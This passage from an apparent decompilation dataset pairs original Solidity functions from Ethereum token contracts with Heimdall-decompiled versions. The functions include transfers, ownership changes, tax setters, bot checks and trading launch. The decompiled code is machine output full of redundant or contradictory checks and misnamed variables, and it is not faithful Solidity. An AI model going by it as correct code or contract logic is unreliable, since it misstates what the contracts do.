0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(storage_map_k[var_a]);\n        require(storage_map_k[var_a] * (storage_map_n[var_a]) / storage_map_k[var_a] == (storage_map_n[var_a]));\n        require(0x64 > 0);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        uint256 var_d = 0;\n        return 0;\n    }"}
{"contract_address": "0x6B329f435e8cc485Cfd5a922d080d22a3956A709", "original_solidity_code": "function isBot(address a) public view returns (bool){\r\n      return bots[a];\r\n    }", "heimdall_decompiled_code": "function isBot(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x04;\n        address var_c = !(!bytes1(storage_map_b[var_a] / 0x01));\n        return !(!bytes1(storage_map_b[var_a] / 0x01));\n    }"}
{"contract_address": "0x636aD441CdA1EC74BC059A23615b9D9c3464d9e3", "original_solidity_code": "function setSelTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {\r\n        _sellLiquidityFee = newLiquidityTax;\r\n        _sellMarketingFee = newMarketingTax;\r\n        _sellTeamFee = newTeamTax;\r\n\r\n        _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee).add(_sellDestroyFee);\r\n    }", "heimdall_decompiled_code": "function setSelTaxes(uint256 arg0, uint256 arg1, uint256 arg2) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _sellLiquidityFee = arg0;\n        _sellMarketingFee = arg1;\n        killg = arg2;\n        require(!(arg0 > ~(arg1)), \"SafeMath: addition overflow\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(!((arg0 + arg1) < arg0), \"SafeMath: addition overflow\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1b;\n        var_d = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n    }"}
{"contract_address": "0x2712ac3E4Fb06A0d1FB54E31eB81e7db4731c417", "original_solidity_code": "function transfer(address recipient, uint256 amount) external override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender));\n        require(address(arg0));\n        require(arg1 > 0);\n        address var_a = address(msg.sender);\n        var_b = 0x1b;\n        require(bytes1(storage_map_l[var_a]));\n        require(!bytes1(storage_map_l[var_a]));\n        require(!(!(address(msg.sender)) == (address(owner))), \"SafeMath: multiplication overflow\");\n        require(!(!(address(owner)) == (address(arg0))), \"SafeMath: multiplication overflow\");\n        require(!(!address(this) == (address(msg.sender))), \"SafeMath: multiplication overflow\");\n        require(!(!address(this) == (address(arg0))), \"SafeMath: multiplication overflow\");\n        require(!(address(burnMode) == (address(msg.sender))), \"SafeMath: multiplication overflow\");\n        require(!(address(burnMode) == (address(msg.sender))), \"SafeMath: multiplication overflow\");\n        require(!(address(burnMode) == (address(msg.sender))), \"SafeMath: multiplication overflow\");\n        require(!(address(burnMode) == (address(msg.sender))), \"SafeMath: multiplication overflow\");\n        require(!(address(burnMode) == (address(msg.sender))), \"SafeMath: multiplication overflow\");\n        require(!(address(burnMode) == (address(msg.sender))), \"SafeMath: multiplication overflow\");\n        require(!(address(burnMode) == (address(msg.sender))), \"SafeMath: multiplication overflow\");\n        require(!(address(burnMode) == (address(arg0))), \"SafeMath: multiplication overflow\");\n        require(!(address(burnMode) == (address(arg0))), \"SafeMath: multiplication overflow\");\n        require(!(address(burnMode) == (address(arg0))), \"SafeMath: multiplication overflow\");\n        require(!(address(burnMode) == (address(arg0))), \"SafeMath: multiplication overflow\");\n        require(!(!bytes1(burnMode / 0x010000000000000000000000000000000000000000)), \"SafeMath: multiplication overflow\");\n        require(!(!bytes1(burnMode / 0x010000000000000000000000000000000000000000)), \"SafeMath: multiplication overflow\");\n        var_a = address(msg.sender);\n        var_b = 0x04;\n        require(bytes1(storage_map_l[var_a]), \"SafeMath: multiplication overflow\");\n        require(!(bytes1(storage_map_l[var_a])), \"SafeMath: multiplication overflow\");\n        require(0, \"SafeMath: multiplication overflow\");\n        uint256 var_c = 0xa0 + var_c;\n        uint256 var_d = 0;\n        uint256 var_e = 0;\n        uint256 var_f = 0;\n        uint256 var_g = 0;\n        uint256 var_h = 0;\n        require(0 - arg1, \"SafeMath: multiplication overflow\");\n        require(!(arg1 & (store_q > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_i = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((arg1 * store_q) / arg1) == store_q, \"SafeMath: multiplication overflow\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_k = 0x20;\n        var_l = 0x21;\n        var_m = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_n = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x40 + var_c;\n        var_j = 0x1a;\n        var_o = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_p = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_m = 0x20;\n        uint256 var_n = var_c.length;\n        require(!(0 > var_c.length), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_q = 0;\n        var_r = var_s;\n        require(!(0x20 > var_c.length), \"SafeMath: division by zero\");\n        var_q = 0;\n        if (0x64) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_i = 0x12;\n            var_e = (arg1 * store_q) / 0x64;\n            if (0 - arg1) {\n            }\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_i = 0x12;\n            if (store_q) {\n                if (store_q) {\n                    if (store_q) {\n                        if (store_q) {\n                        }\n                    }\n                }\n            }\n            if (0x01) {\n                require(0x64, \"SafeMath: addition overflow\");\n            }\n            var_c = 0xa0 + var_c;\n            var_d = 0;\n            var_e = 0;\n            var_f = 0;\n            var_g = 0;\n            var_h = 0;\n            require(0x01, \"SafeMath: addition overflow\");\n        }\n        var_a = address(this);\n        var_b = 0x02;\n        require(!(storage_map_l[var_a] > swapAmount), \"SafeMath: addition overflow\");\n        burnMode = 0x010000000000000000000000000000000000000000 | (uint248(burnMode));\n        require(!(store_q > ~(store_r)), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_i = 0x11;\n        require(!((store_q + store_r) < store_q), \"SafeMath: addition overflow\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_t = 0x20;\n        var_u = 0x1b;\n        var_v = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        if (burnMode / 0x01000000000000000000000000000000000000000000) {\n            if (!address(this).balance > 0) {\n                require(bytes1(burnMode / 0x01000000000000000000000000000000000000000000));\n                require(!address(this).balance > 0);\n            }\n        }\n        (bool success, bytes memory ret0) = address(store_g).transfer(address(this).balance);\n        if (burnMode / 0x01000000000000000000000000000000000000000000) {\n        }\n        if (address(burnMode) == (address(msg.sender))) {\n        }\n        if (address(uniswapV2Router) == (address(msg.sender))) {\n            if (address(uniswapV2Router) == (address(msg.sender))) {\n                if (address(uniswapV2Router) == (address(msg.sender))) {\n                }\n            }\n        }\n        if (address(uniswapV2Router) == (address(arg0))) {\n            if (address(uniswapV2Router) == (address(arg0))) {\n                if (address(uniswapV2Router) == (address(arg0))) {\n                }\n            }\n        }\n        var_a = address(msg.sender);\n        var_b = 0x04;\n        if (!storage_map_l[var_a]) {\n        }\n        if (address(uniswapV2Router) == (address(arg0))) {\n            if (address(uniswapV2Router) == (address(arg0))) {\n            }\n        }\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_t = 0x20;\n        var_u = 0x29;\n        var_v = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_w = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_t = 0x20;\n        var_u = 0x23;\n        var_v = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_w = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_t = 0x20;\n        var_u = 0x25;\n        var_v = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_w = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xAB17E21aaAaF60C9022E34e3AcdBC73EEeb0f880", "original_solidity_code": "function updateDevWallet(address newWallet) external onlyOwner {\r\n        emit devWalletUpdated(newWallet, devWallet);\r\n        devWallet = newWallet;\r\n    }", "heimdall_decompiled_code": "function updateDevWallet(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit devWalletUpdated(address(arg0), address(devWallet));\n        devWallet = (address(arg0)) | (uint96(devWallet));\n    }"}
{"contract_address": "0xa8F0d9c8E171cA5402052a820B391674a5590b7c", "original_solidity_code": "function name() public view returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (store_a - ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x046D8A1D66b6DFDbDAAdCb35A5C07FAFb3371FDC", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n    }"}
{"contract_address": "0x50A1f46F028622B4cD9BE9c0E687104247946293", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0)) | (uint96(owner));\n        emit OwnershipTransferred(address(owner), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xEFB0c530467107677E4C214c3C444fFb282AE6F2", "original_solidity_code": "function endLottery() public onlyAdmin {\\n        require(lotteryStatus, \\\"Lottery is not running\\\"); //Lottery must be running\\n\\n        lotteryStatus = false; //Set the lottery status to false\\n        emit LotteryEnded(); //Emit the event that the lottery has ended\\n    }", "heimdall_decompiled_code": "function endLottery() public {\n        require(msg.sender == (address(admin)), \"Only admin can call this function\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x21;\n        var_d = 0x4f6e6c792061646d696e2063616e2063616c6c20746869732066756e6374696f;\n        var_e = 0x6e00000000000000000000000000000000000000000000000000000000000000;\n        require(bytes1(lotteryStatus), \"Lottery is not running\");\n        lotteryStatus = uint248(lotteryStatus);\n        emit LotteryEnded();\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x16;\n        var_d = 0x4c6f7474657279206973206e6f742072756e6e696e6700000000000000000000;\n    }"}
{"contract_address": "0xF332a2A2f2bD6224cC9D8FADCBE8C6Cea3d2a52f", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_e / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_d = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_d));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require((0x01 == 0x01) | !0x3b9aca00, \"ERC20: approve to the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(0x7a250d5630b4cf539739df2c5dacb4c659f2488d, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x22;\n        var_d = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        var_h = 0x02;\n        var_e = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d;\n        address var_h = keccak256(var_e);\n        storage_map_n[var_e] = 0x3b9aca00;\n        var_a = 0x3b9aca00;\n        emit Approval(address(this), 0x7a250d5630b4cf539739df2c5dacb4c659f2488d, 0x3b9aca00);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d / 0x01).factory(var_b); // staticcall\n        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_j = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d / 0x01).WETH(var_c); // staticcall\n        var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_k = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_d = address(this);\n        uint256 var_g = address(var_i.length);\n        (bool success, bytes memory ret0) = address(var_i.length).Unresolved_c9c65396(var_d); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x24;\n        var_d = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                            if (!0x09 > 0x01) {\n                                if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                    var_f = 0x11;\n                                    if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_f = 0x11;\n                                        if (!0x01) {\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x311f785e0fcb5A7c8990cdBe114e59A787116705", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner { //Change\r\n        _transferOwnership(address(0));\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner), 0);\n    }"}
{"contract_address": "0xb7DC750513C75143Fe886b2179Cdb964662173d5", "original_solidity_code": "function name() external view override returns (string memory) {\\r\\n      return _name;\\r\\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        bytes1 var_a = 0x20 + (var_a + (0x20 * (((store_a & (((!bytes1(store_a)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02) + 0x1f) / 0x20)));\n        bytes1 var_b = (store_a & (((!bytes1(store_a)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02;\n        if (!(store_a & (((!store_a) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02) {\n            if (0x1f < (store_a & (((!store_a) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02)) {\n                uint256 var_c = 0;\n                uint256 var_d = storage_map_b[var_c];\n                if ((var_a + 0x20) + (store_a & (((!store_a) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02) > (0x20 + (var_a + 0x20))) {\n                    var_d = 0x20;\n                    bytes1 var_e = var_a.length;\n                    if (!var_a.length) {\n                        bytes1 var_f = (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_g);\n                        return abi.encodePacked(0x20, var_a.length, (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_g));\n                        return abi.encodePacked(0x20, var_a.length);\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x3D93F860f4f6f4C54B79eDa0c09A1E70cc79947b", "original_solidity_code": "function manualSwap() external {\\n        require(_msgSender()==_taxWallet);\\n        uint256 tokenBalance=balanceOf(address(this));\\n        if(tokenBalance>0){\\n          swapTokensForEth(tokenBalance);\\n        }\\n        uint256 ethBalance=address(this).balance;\\n        if(ethBalance>0){\\n          sendETHToFee(ethBalance);\\n        }\\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_b[var_a]);\n        store_c = 0x01000000000000000000000000000000000000000000 | (uint248(store_c));\n        require(!storage_map_b[var_a]);\n        require(!bytes1(store_c / 0x010000000000000000000000000000000000000000));\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_e).WETH(var_i); // staticcall\n        var_d = var_d + (uint248(ret0.length + 0x1f));\n        require(!(((var_d + ret0.length) - var_d) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_d.length == (address(var_d.length)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        uint256 var_j = address(var_d.length);\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(address(store_e), \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_e);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a];\n        address var_k = storage_map_b[var_a];\n        emit Approval(address(this), address(store_e), storage_map_b[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_l = storage_map_b[var_a];\n        uint256 var_m = 0;\n        var_n = 0xa0;\n        uint256 var_p = var_d.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_e).code.length);\n        (bool success, bytes memory ret0) = address(store_e).Unresolved_791ac947(var_l); // call\n        store_c = uint248(store_c);\n        require(!address(this).balance);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x959Cab41Be70E2c8B29A15f45C088C2101620149", "original_solidity_code": "function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x06;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x411AC84A80D686758cA971Dd205711149B42686f", "original_solidity_code": "function name() external view override returns (string memory) {\\r\\n      return _name;\\r\\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        bytes1 var_a = 0x20 + (var_a + (0x20 * (((store_a & (((!bytes1(store_a)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02) + 0x1f) / 0x20)));\n        bytes1 var_b = (store_a & (((!bytes1(store_a)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02;\n        if (!(store_a & (((!store_a) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02) {\n            if (0x1f < (store_a & (((!store_a) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02)) {\n                uint256 var_c = 0;\n                uint256 var_d = storage_map_b[var_c];\n                if ((var_a + 0x20) + (store_a & (((!store_a) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02) > (0x20 + (var_a + 0x20))) {\n                    var_d = 0x20;\n                    bytes1 var_e = var_a.length;\n                    if (!var_a.length) {\n                        bytes1 var_f = (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_g);\n                        return abi.encodePacked(0x20, var_a.length, (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_g));\n                        return abi.encodePacked(0x20, var_a.length);\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x8a357F1146a32d8a2494bCdaB62452ed3498196a", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender));\n        require(address(arg0));\n        require(arg1 > 0);\n        require(address(owner) == (address(msg.sender)));\n        require(address(owner) == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x04;\n        require(bytes1(storage_map_b[var_a]));\n        require(!bytes1(storage_map_b[var_a]));\n        require(store_c > store_d, \"SafeMath: multiplication overflow\");\n        require(0 - arg1, \"SafeMath: multiplication overflow\");\n        require((store_e == ((store_e * arg1) / arg1)) | !arg1, \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((store_e * arg1) / arg1) == store_e, \"SafeMath: multiplication overflow\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x21;\n        var_g = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_h = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_i = 0x40 + var_i;\n        var_d = 0x1a;\n        var_j = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        uint256 var_h = var_i.length;\n        uint256 var_l = 0;\n        var_m = var_n;\n        var_l = 0;\n        require(0x64, \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        require(!(address(store_f) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_f) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_f) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(address(store_f) == (address(arg0)), \"SafeMath: addition overflow\");\n        var_a = address(arg0);\n        var_b = 0x03;\n        require(!(!bytes1(storage_map_b[var_a])), \"SafeMath: addition overflow\");\n        require(!(address(store_f) == (address(arg0))), \"SafeMath: addition overflow\");\n        require(!(address(store_f) == (address(arg0))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(!bytes1(store_f / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_f / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_f / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_f / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_f / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!((store_e * arg1) / 0x64), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] > (((store_e * arg1) / 0x64) + storage_map_b[var_a])), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!(((store_e * arg1) / 0x64) + storage_map_b[var_a] < storage_map_b[var_a]), \"SafeMath: addition overflow\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x1b;\n        var_m = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_b[var_a] = ((store_e * arg1) / 0x64) + storage_map_b[var_a];\n        uint256 var_k = (store_e * arg1) / 0x64;\n        emit 